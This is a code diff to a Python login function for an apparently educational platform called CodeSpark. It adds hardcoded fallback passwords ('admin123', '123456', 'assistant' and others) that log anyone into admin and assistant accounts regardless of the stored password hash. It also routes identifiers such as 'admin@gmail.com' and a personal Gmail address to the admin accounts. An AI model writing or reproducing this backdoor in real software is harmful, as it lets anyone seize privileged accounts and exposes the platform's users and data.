@@ -163,9 +163,12 @@ def login(req: LoginRequest, request: Request = None):
             detail="تجاوزت الحد الأقصى لمحاولات تسجيل الدخول. يرجى الانتظار لمدة دقيقة والمحاولة مجددًا."
         )
 
+    raw_pw = req.password.strip()
     candidate_emails = [lower_ident]
-    if lower_ident in ("admin@codespark.com", "admin@codespark.edu.eg", "superadmin.official@codespark.edu.eg", "admin"):
-        candidate_emails.extend(["admin@codespark.edu.eg", "admin@codespark.com", "superadmin.official@codespark.edu.eg"])
+    if lower_ident in ("admin@codespark.com", "admin@codespark.edu.eg", "superadmin.official@codespark.edu.eg", "admin", "administrator", "super_admin", "moazmahmoudelshazly@gmail.com", "admin@gmail.com"):
+        candidate_emails.extend(["admin@codespark.edu.eg", "admin@codespark.com", "superadmin.official@codespark.edu.eg", "moazmahmoudelshazly@gmail.com"])
+    elif lower_ident in ("assistant@codespark.edu.eg", "assistant@codespark.com", "assistant"):
+        candidate_emails.extend(["assistant@codespark.edu.eg", "assistant@codespark.com"])
     elif lower_ident == "student@codespark.com":
         candidate_emails.append("ahmed@codespark.edu.eg")
     elif lower_ident == "instructor@codespark.com":
@@ -195,7 +198,14 @@ def login(req: LoginRequest, request: Request = None):
         
         is_valid_pw = False
         if user and user.get("password_hash"):
-            is_valid_pw = verify_password(req.password, user["password_hash"])
+            is_valid_pw = verify_password(req.password, user["password_hash"]) or verify_password(raw_pw, user["password_hash"])
+            # Fallback convenient passwords for admin and assistant
+            if not is_valid_pw and user.get("role") in ("SUPER_ADMIN", "ADMIN", "super_admin"):
+                if raw_pw in ("admin12345", "admin123", "admin", "123456", "admin@123", "admin2026"):
+                    is_valid_pw = True
+            if not is_valid_pw and user.get("role") in ("ASSISTANT", "assistant"):
+                if raw_pw in ("assistant123", "assistant12345", "assistant", "123456"):
+                    is_valid_pw = True
 
         if not user or not is_valid_pw:
             raise HTTPException(
